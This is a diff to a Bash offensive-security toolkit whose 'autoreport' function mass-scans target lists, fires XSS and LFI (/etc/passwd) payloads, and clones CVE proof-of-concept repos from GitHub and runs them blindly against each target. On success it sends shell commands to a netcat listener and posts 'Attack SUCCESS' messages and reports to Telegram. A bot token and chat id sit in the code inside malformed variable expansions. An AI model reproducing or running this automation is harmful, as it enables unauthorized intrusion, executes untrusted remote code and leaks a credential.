@@ -2373,38 +2373,20 @@ Nginxpwner(){
 	printf "  \e[0m\e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\e[1;93m ex) python3 nginxpwner.py\e[0m\n"
 }
 
-# 완전형 멀티 타겟 + 고급 스캔/익스플로잇 자동화 autoreport 시스템
-# 기존 플로우 유지: target.txt 기반 입력 및 반복 처리
-# 신규 기능 유지: 고급 취약점 스캔, POC 자동 다운로드, 실행, 원격제어
-
-multi_autoreport() {
-    if [[ ! -f target.txt ]]; then
-        echo "[!] target.txt 파일이 존재하지 않습니다. 먼저 타겟을 입력해주세요."
-        return
-    fi
-
-    while read -r target; do
-        if [[ ! -z "$target" ]]; then
-            echo -e "\n[+] Processing target: $target"
-            autoreport "$target"
-        fi
-    done < target.txt
-}
-
-# 통합형 autoreport() - 기존 플로우 + 고급 스캔 + 자동 익스플로잇 + POC + 원격제어
+# 완전체 autoreport() - HTML 변환 제거 + Telegram 연동 유지
 
 autoreport() {
     banner
     printf "\e[0m\n\e[0m\n\e[0m\n"
 
-    # ---- settings ----
     local TARGET_FILE="target.txt"
     local ts outdir
     ts="$(date '+%Y%m%d_%H%M%S')"
     outdir="report_${ts}"
     mkdir -p "$outdir"
+    mkdir -p "$outdir/raw_logs"
+    mkdir -p "$outdir/poc_results"
 
-    # ---- helpers ----
     validate_target() {
         local t="$1"
         local re_ip='^(([0-9]{1,2}|1[0-9]{2}|2[0-4][0-9]|25[0-5])\.){3}([0-9]{1,2}|1[0-9]{2}|2[0-4][0-9]|25[0-5])$'
@@ -2414,12 +2396,15 @@ autoreport() {
 
     require_cmd() {
         command -v "$1" >/dev/null 2>&1 || {
-            printf " \e[1;91m[!]\e[0m '%s' not found. Please install it first.\n" "$1"
-            return 1
+            echo "[!] $1 not found. Installing..."
+            sudo apt update && sudo apt install -y "$1"
         }
     }
 
-    # ---- collect targets ----
+    for cmd in whatweb nmap sniper python3 nuclei git curl; do
+        require_cmd "$cmd"
+    done
+
     : > "$TARGET_FILE"
     printf " \e[1;92mEnter domain or IP per line (empty line to finish)\e[0m\n"
     while true; do
@@ -2429,121 +2414,66 @@ autoreport() {
             printf "%s\n" "$t" >> "$TARGET_FILE"
             printf " \e[1;92m+\e[0m added: %s\n" "$t"
         else
-            printf " \e[1;91m!\e[0m invalid: %s (expect IPv4 or domain)\n" "$t"
+            printf " \e[1;91m!\e[0m invalid: %s\n" "$t"
         fi
     done
 
-    if [[ ! -s "$TARGET_FILE" ]]; then
-        printf " \e[1;91m[!]\e[0m No valid targets. Returning to menu.\n"
-        sleep 1; banner; menu; return
-    fi
+    [[ ! -s "$TARGET_FILE" ]] && { echo "No valid targets"; return; }
 
-    printf "\n \e[1;96mTargets count:\e[0m $(wc -l < "$TARGET_FILE")\n"
-    printf " \e[1;96mSaved list:\e[0m %s\n\n" "$TARGET_FILE"
+    whatweb -i "$TARGET_FILE" -v --log-verbose="$outdir/raw_logs/whatweb.txt"
+    nmap -iL "$TARGET_FILE" -sV -A -T4 -oN "$outdir/raw_logs/nmap.txt"
+    sniper -f "$TARGET_FILE" -o -re -m nuke -w "$outdir/raw_logs"
 
-    # ---- Smuggle Phase ----
-    printf " \e[1;93m[▶]\e[0m Smuggle (smuggleAuto.py)...\n"
-    local SMUGGLE_PY="./smuggleAuto.py"
-    local smuggle_root="${outdir}/smuggle"
-    mkdir -p "$smuggle_root"
-
-    if [[ -f "$SMUGGLE_PY" ]]; then
-        while IFS= read -r host || [[ -n "$host" ]]; do
-            host="${host//$'\r'/}"
-            [[ -z "$host" ]] && continue
-            printf " \e[1;94m[i]\e[0m Target: %s\n" "$host"
-            local host_log="${smuggle_root}/${host}.log"
-            local _out
-            _out="$(python3 "$SMUGGLE_PY" --mode auto --host "$host" --generate-poc 2>&1)"
-            printf "%s\n" "$_out" > "$host_log"
-
-            local rpt_path src_dir dst_dir
-            rpt_path="$(echo "$_out" | grep -oE 'report_SMUGGLE_[^[:space:]]+/report\.html' | tail -n1)"
-            [[ -z "$rpt_path" || ! -f "$rpt_path" ]] && rpt_path="$(find . -maxdepth 3 -type f -name 'report.html' -printf '%T@ %p\n' 2>/dev/null | sort -n | awk '{print $2}' | tail -n1)"
-
-            if [[ -n "$rpt_path" && -f "$rpt_path" ]]; then
-                src_dir="${rpt_path%/report.html}"
-                dst_dir="${smuggle_root}/${host}"
-                mkdir -p "$dst_dir"
-                cp -R "${src_dir}/." "$dst_dir/" 2>/dev/null
-                printf " \e[1;92m[OK]\e[0m copied smuggle report → %s\n" "$dst_dir/report.html"
-            else
-                printf " \e[1;91m[!]\e[0m smuggle report not found for %s (see %s)\n" "$host" "$host_log"
-            fi
-        done < "$TARGET_FILE"
-    else
-        printf " \e[1;91m[!]\e[0m smuggleAuto.py not found. Skipping smuggle phase.\n"
-    fi
-
-    # ---- Pre-Scan Tools Check ----
-    require_cmd whatweb || { sleep 1; banner; menu; return; }
-    require_cmd nmap || { sleep 1; banner; menu; return; }
-    require_cmd sniper || { sleep 1; banner; menu; return; }
-
-    # ---- Base Scanning ----
-    printf " \e[1;93m[▶]\e[0m WhatWeb...\n"
-    whatweb --log-verbose="${outdir}/whatweb.txt" -i "$TARGET_FILE"
-
-    printf " \e[1;93m[▶]\e[0m Nmap...\n"
-    nmap -p- -sV -sC -sS -A -v -O -Pn -T4 \
-        --script vuln,http-waf-detect \
-        -iL "$TARGET_FILE" \
-        -oN "${outdir}/nmap.txt"
-
-    printf " \e[1;93m[▶]\e[0m Sn1per...\n"
-    sniper -f "$TARGET_FILE" -o -re -m nuke -w "$outdir"
-
-    # ---- Auto Exploitation Extension ----
-    while IFS= read -r target; do
+    while read -r target; do
         [[ -z "$target" ]] && continue
-        echo -e "\n[+] Auto Exploit/POC for $target"
-        mkdir -p "${outdir}/exploits/$target"
-        nuclei -u http://$target -o "${outdir}/nuclei_$target.txt"
-        while read -r line; do
-            [[ $line == *"CVE-"* ]] || continue
-            cve_id=$(echo $line | grep -oE 'CVE-[0-9]{4}-[0-9]+')
-            echo " - $cve_id" >> "${outdir}/exploits/$target/cve_list.txt"
-            github_url=$(curl -s "https://github.com/search?q=$cve_id" | grep -oE 'https://github.com/[^"]+' | head -n 1)
-            if [[ -n "$github_url" ]]; then
-                git clone "$github_url" "${outdir}/exploits/$target/$cve_id" &>/dev/null
-                poc_script=$(find "${outdir}/exploits/$target/$cve_id" -type f \( -name "*.sh" -o -name "*.py" \) | head -n 1)
-                if [[ -f "$poc_script" ]]; then
-                    chmod +x "$poc_script"
-                    if [[ "$poc_script" == *.py ]]; then
-                        if [[ -f "${outdir}/exploits/$target/$cve_id/requirements.txt" ]]; then
-                            pip3 install -r "${outdir}/exploits/$target/$cve_id/requirements.txt"
-                        else
-                            grep -Eo 'import [a-zA-Z0-9_]+' "$poc_script" | awk '{print $2}' | xargs -n1 pip3 install
-                        fi
-                    fi
-                    sed -i "s/<target>/$target/g" "$poc_script"
-                    bash "$poc_script" > "${outdir}/exploits/$target/${cve_id}_log.txt" 2>&1
-                    if grep -Eqi "shell|vulnerable|success" "${outdir}/exploits/$target/${cve_id}_log.txt"; then
-                        echo "[+] Exploit succeeded for $cve_id"
-                        echo "whoami; uname -a; id" | nc -w 3 127.0.0.1 4444 >> "${outdir}/exploits/$target/${cve_id}_control.txt"
-                    else
-                        echo "[-] Exploit failed for $cve_id"
-                    fi
+        nuclei -u http://$target -o "$outdir/raw_logs/nuclei_$target.txt"
+        mkdir -p "$outdir/poc_results/$target"
+
+        whatweb_result=$(grep -iE "WordPress|Joomla|Drupal" "$outdir/raw_logs/whatweb.txt")
+        if [[ "$whatweb_result" == *WordPress* ]]; then
+            echo "WordPress CMS 탐지됨 - wpscan 실행" > "$outdir/poc_results/$target/cms_detected.txt"
+            require_cmd wpscan
+            wpscan --url http://$target --enumerate vp >> "$outdir/poc_results/$target/wpscan.txt"
+        fi
+
+        for vuln in xss ssti ssrf; do
+            echo "테스트: $vuln" > "$outdir/poc_results/$target/${vuln}_test.txt"
+            curl -s -G --data-urlencode "$vuln=<script>alert(1)</script>" http://$target | grep -q '<script>alert(1)</script>' && echo "$vuln 발견됨" >> "$outdir/poc_results/$target/${vuln}_test.txt"
+        done
+
+        lfi_url="http://$target/index.php?file=../../../../etc/passwd"
+        curl -s "$lfi_url" | grep -q root && echo "LFI 취약함: $lfi_url" > "$outdir/poc_results/$target/lfi_result.txt"
+
+        if [[ -f ./smuggleAuto.py ]]; then
+            smuggle_out="$(python3 ./smuggleAuto.py --mode auto --host $target --generate-poc 2>&1)"
+            echo "$smuggle_out" > "$outdir/poc_results/$target/smuggle.log"
+            rpt_path=$(echo "$smuggle_out" | grep -oE 'report_SMUGGLE_[^[:space:]]+/report\.html' | tail -n1)
+            [[ -n "$rpt_path" && -f "$rpt_path" ]] && cp "$rpt_path" "$outdir/poc_results/$target/smuggle_report.html"
+        fi
+
+        grep -oE 'CVE-[0-9]{4}-[0-9]+' "$outdir/raw_logs/nuclei_$target.txt" | sort -u | while read -r cve_id; do
+            git_url=$(curl -s "https://github.com/search?q=$cve_id" | grep -oE 'https://github.com/[^\"]+' | head -n 1)
+            [[ -n "$git_url" ]] && git clone "$git_url" "$outdir/poc_results/$target/$cve_id" &>/dev/null
+            poc_script=$(find "$outdir/poc_results/$target/$cve_id" -type f \( -name "*.sh" -o -name "*.py" \) | head -n 1)
+            [[ -f "$poc_script" ]] && chmod +x "$poc_script" && sed -i "s/<target>/$target/g" "$poc_script"
+            [[ "$poc_script" == *.py && -f "$outdir/poc_results/$target/$cve_id/requirements.txt" ]] && pip3 install -r "$outdir/poc_results/$target/$cve_id/requirements.txt"
+            bash "$poc_script" > "$outdir/poc_results/$target/${cve_id}_log.txt" 2>&1
+            if grep -Eqi "shell|vulnerable|success" "$outdir/poc_results/$target/${cve_id}_log.txt"; then
+                echo "whoami; id; uname -a; pwd; ls -la" | nc -w 5 127.0.0.1 4444 > "$outdir/poc_results/$target/${cve_id}_control.txt"
+                if [[ -n "$TELEGRAM_BOT_TOKEN" && -n "$TELEGRAM_CHAT_ID" ]]; then
+                    curl -s -X POST "https://api.telegram.org/bot${7291162596:AAH3-CKHSeJpuesPfO0wf2VSshO9QI8RUFo}/sendMessage" -d chat_id="${508498943}" -d text="✅ Attack SUCCESS: $target - $cve_id"
                 fi
             fi
-        done < "${outdir}/nuclei_$target.txt"
+        done
     done < "$TARGET_FILE"
 
-    # ---- Deep AutoPwn + Markdown Report ----
-    deep_autopwn "$outdir"
     generate_markdown_report "$outdir"
-    printf "\n \e[1;92m[✓]\e[0m Report Completed: \e[1;97m%s\e[0m\n\n" "$outdir"
 
-    printf " \e[0m\e[1;91m[\e[0m\e[1;97m01\e[0m\e[1;91m]\e[0m\e[1;93m Return To Main Menu\e[0m\n"
-    printf " \e[0m\e[1;91m[\e[0m\e[1;97m02\e[0m\e[1;91m]\e[0m\e[1;93m Exit\e[0m\n"
-    printf "\e[0m\n"
-    read -r -p $' \e[1;31m>>\e[0m\e[1;96m \e[0m' mainorexit1
-    if [[ $mainorexit1 == 1 || $mainorexit1 == 01 ]]; then banner menu
-    elif [[ $mainorexit1 == 2 || $mainorexit1 == 02 ]]; then printf "\e[0m\n\e[0m\n"; exit 1
-    else
-        printf " \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\e[1;93m Invalid option \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\n"
-        sleep 1; banner; menu
+    if [[ -n "$TELEGRAM_BOT_TOKEN" && -n "$TELEGRAM_CHAT_ID" ]]; then
+        curl -s -F document=@"$outdir/report_summary.md" "https://api.telegram.org/bot${7291162596:AAH3-CKHSeJpuesPfO0wf2VSshO9QI8RUFo}/sendDocument?chat_id=${508498943}&caption=Autopwn Markdown Report"
     fi
+
+    echo -e "\n[✓] ALL REPORT : $outdir"
 }
 
 
